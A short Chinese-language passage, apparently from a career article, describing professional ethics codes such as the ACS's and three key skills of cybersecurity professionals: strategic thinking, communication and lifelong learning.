许多专家组织对其员工维持高标准，以确保职业地位得到维护。例如，ACS 有所有认证人员必须遵守的伦理准则，此外还有其他要求，如证明持续的个人成长以及在所选专业领域拥有学位。

### 网络安全专业人士的三项关键技能

有效的 IT保护专家需要的不仅仅是专业能力。要在这个领域真正取得进步，这些专业人士应该：

- 策略家 - 网络安全专业人员除了组织内部调整外，还要准备主动使用安全措施，权衡任何行动的后果。卓越的安全协议需要对工作、依赖关系、预算和资源进行战术和战略评估。由于全新的信息黑客手段不断发展，专家必须向前一步，学习在线黑客如何进入网络以及阻止他们的程序。

- 沟通者 - 管理层除了沟通技巧，还需要确保与团队和客户保持良好的协调——技术和安全涉及业务中的每位专家。保护专家必须以大规模的方式进行互动，通过教学和授权人员来协助执行保护策略。

- 终身学习者 - 另一个具备的能力是专业能力。随着保护技术的发展速度，这意味着需要不断投入：学习、教育和持续的通用认证。这些专业人士必须不断学习新的革命性技术，以具备解决复杂安全问题的能力。
